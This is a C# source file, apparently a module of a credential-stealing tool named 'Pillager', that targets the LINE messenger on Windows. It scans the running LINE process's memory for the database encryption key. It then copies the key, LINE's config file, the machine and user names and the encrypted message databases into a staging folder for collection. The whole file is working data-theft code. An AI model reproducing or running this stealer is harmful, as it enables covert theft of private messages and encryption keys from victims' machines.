using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace Pillager.Messengers
{
    internal class Line : ICommand
    {
        public string getkey()
        {
            try
            {
                Process[] processes = Process.GetProcessesByName("Line");
                if (processes.Length == 0) return null;
                List<long> l = Methods.SearchProcess(processes[0], "encryptionKey=");
                foreach (var item in l)
                {
                    byte[] buffer = new byte[49];
                    bool success = Native.ReadProcessMemory(processes[0].Handle, (IntPtr)item, buffer, buffer.Length, out _);
                    string r = Encoding.UTF8.GetString(buffer);
                    if (r.EndsWith("mse")) return r.Substring(14,32);
                }
            }
            catch
            {
                return null;
            }
            return null;
        }

        public override void Save(string path)
        {
            try
            {
                string inipath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "LINE\\Data\\Line.ini");
                if (!File.Exists(inipath)) return;
                string savepath = Path.Combine(path, "Line");
                Directory.CreateDirectory(savepath);
                File.Copy(inipath, Path.Combine(savepath, "Line.ini"));
                string info = "Computer Name = " + Environment.MachineName + Environment.NewLine + "User Name = " + Environment.UserName;
                File.WriteAllText(Path.Combine(savepath, "info.txt"), info, Encoding.UTF8);
                string key = getkey();
                if (!string.IsNullOrEmpty(key))
                {
                    File.WriteAllText(Path.Combine(savepath, "encryptionKey.txt"), key, Encoding.UTF8);
                    string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "LINE\\Data\\db");
                    if (Directory.Exists(dir))
                    {
                        string dbpath = Path.Combine(savepath, "db");
                        Directory.CreateDirectory(dbpath);
                        foreach (var item in Directory.GetFiles(dir, "????????????????????????????????.edb*"))
                        {
                            if (Path.GetFileName(item).Contains("-")) continue;
                            File.Copy(item, Path.Combine(dbpath, Path.GetFileName(item)));
                        }
                    }
                }
            }
            catch { }
        }
    }
}
